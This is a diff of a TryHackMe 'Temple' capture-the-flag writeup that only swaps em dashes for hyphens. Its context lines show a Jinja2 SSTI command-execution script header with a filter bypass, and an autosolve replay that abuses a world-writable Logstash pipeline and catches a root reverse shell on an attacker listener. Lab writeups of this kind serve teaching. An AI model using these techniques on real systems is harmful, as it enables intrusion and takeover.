@@ -1,6 +1,6 @@
 ---
 slug: "thm-temple"
-title: "Temple — TryHackMe Writeup"
+title: "Temple - TryHackMe Writeup"
 date: "2026-09-17"
 platform: "TryHackMe"
 type: "Machine"
@@ -211,7 +211,7 @@ We now have an unauthenticated vector to register arbitrary accounts into the un
 
 ---
 
-## 3. Vulnerability Analysis — Jinja2 SSTI
+## 3. Vulnerability Analysis - Jinja2 SSTI
 
 ### 3.1 Template Injection Probing
 
@@ -331,7 +331,7 @@ We construct an automated Python exploit script to register a unique payload use
 ```python
 #!/usr/bin/env python3
 """
-Temple TryHackMe — Jinja2 SSTI Command Execution Tool
+Temple TryHackMe - Jinja2 SSTI Command Execution Tool
 Bypasses character filter (' _ # & ;) using hex escapes and cycler globals.
 """
 import re
@@ -451,7 +451,7 @@ asbawy@kali:~$ python3 temple_rce.py "cat /home/bill/flag1.txt"
 
 ---
 
-## 4. Privilege Escalation — Logstash Pipeline Abuse
+## 4. Privilege Escalation - Logstash Pipeline Abuse
 
 ### 4.1 Internal Enumeration & Process Auditing
 
@@ -627,7 +627,7 @@ root@temple:/root# cat script.sh
 
 ## 5. Automation (/autosolve)
 
-To demonstrate how the entire attack chain can be automated end-to-end—from directory enumeration and SSTI weaponization to Logstash pipeline injection and root privilege escalation—we present the interactive terminal solver replay:
+To demonstrate how the entire attack chain can be automated end-to-end - from directory enumeration and SSTI weaponization to Logstash pipeline injection and root privilege escalation - we present the interactive terminal solver replay:
 
 <TerminalReplay
   title="temple_autosolve.py"
@@ -641,7 +641,7 @@ To demonstrate how the entire attack chain can be automated end-to-end—from di
   ]}
   steps={[
     {
-      label: "Step 1/5 — Fingerprint Services & Recurse Endpoints",
+      label: "Step 1/5 - Fingerprint Services & Recurse Endpoints",
       command: "python3 temple_autosolve.py --target http://10.114.137.179:61337 --lhost 10.14.93.55 --lport 4444",
       output: [
         { text: "[*] Probing target WSGI web service on port 61337...", color: "blue" },
@@ -652,7 +652,7 @@ To demonstrate how the entire attack chain can be automated end-to-end—from di
       delayAfter: 600,
     },
     {
-      label: "Step 2/5 — Probe SSTI & Verify Character Blacklist",
+      label: "Step 2/5 - Probe SSTI & Verify Character Blacklist",
       output: [
         { text: "[*] Testing template injection with {{7*7}}...", color: "blue" },
         { text: "[✓] Server evaluated template expression! Reflected 'Logged in as 49'", color: "green" },
@@ -662,7 +662,7 @@ To demonstrate how the entire attack chain can be automated end-to-end—from di
       delayAfter: 700,
     },
     {
-      label: "Step 3/5 — Execute Commands as bill & Harvest User Flag",
+      label: "Step 3/5 - Execute Commands as bill & Harvest User Flag",
       output: [
         { text: "[*] Dispatching sanitized payload to spawn 'id'...", color: "blue" },
         { text: "[✓] Executed successfully: uid=1000(bill) gid=1000(bill)", color: "green" },
@@ -672,7 +672,7 @@ To demonstrate how the entire attack chain can be automated end-to-end—from di
       delayAfter: 700,
     },
     {
-      label: "Step 4/5 — Audit Logstash & Stage Malicious Pipeline",
+      label: "Step 4/5 - Audit Logstash & Stage Malicious Pipeline",
       output: [
         { text: "[*] Checking root processes: Logstash (PID 1437) running as root", color: "blue" },
         { text: "[*] Auditing /etc/logstash/conf.d/logstash-sample.conf permissions: -r--r--rw- (WORLD WRITABLE)", color: "yellow" },
@@ -683,7 +683,7 @@ To demonstrate how the entire attack chain can be automated end-to-end—from di
       delayAfter: 800,
     },
     {
-      label: "Step 5/5 — Catch Root Reverse Shell & Retrieve Final Flag",
+      label: "Step 5/5 - Catch Root Reverse Shell & Retrieve Final Flag",
       output: [
         { text: "[*] Awaiting Logstash auto-reload poll cycle (<= 3s)...", color: "blue" },
         { text: "[✓] Incoming connection received on 10.14.93.55:4444 from 10.114.137.179!", color: "green" },
@@ -701,13 +701,13 @@ To demonstrate how the entire attack chain can be automated end-to-end—from di
 ## 6. References
 
 ### Technical Specifications & Documentation
-- [PortSwigger Web Security — Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection)
-- [PayloadsAllTheThings — Jinja2 Template Injection Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
-- [Elasticsearch — Logstash Exec Input Plugin Reference](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-exec.html)
-- [Jinja2 Official Documentation — Built-in Filters & Utilities](https://jinja.palletsprojects.com/en/latest/templates/#builtin-filters)
+- [PortSwigger Web Security - Server-Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection)
+- [PayloadsAllTheThings - Jinja2 Template Injection Methodology](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+- [Elasticsearch - Logstash Exec Input Plugin Reference](https://www.elastic.co/guide/en/logstash/current/plugins-inputs-exec.html)
+- [Jinja2 Official Documentation - Built-in Filters & Utilities](https://jinja.palletsprojects.com/en/latest/templates/#builtin-filters)
 
 ### Related Cheatsheets & Writeups
-- [Contrabando — TryHackMe Writeup (Jinja2 SSTI & Docker Pivoting)](/writeups/thm-contrabando)
-- [Clocky — TryHackMe Writeup (Token Forgery & Flask Reversing)](/writeups/thm-clocky)
+- [Contrabando - TryHackMe Writeup (Jinja2 SSTI & Docker Pivoting)](/writeups/thm-contrabando)
+- [Clocky - TryHackMe Writeup (Token Forgery & Flask Reversing)](/writeups/thm-clocky)
 - [Linux Privilege Escalation: Enumeration & Recon Cheatsheet](/cheatsheet/linux/privesc-enumeration)
 - [Linux Privilege Escalation: Exploitation Techniques Cheatsheet](/cheatsheet/linux/privesc-exploitation)
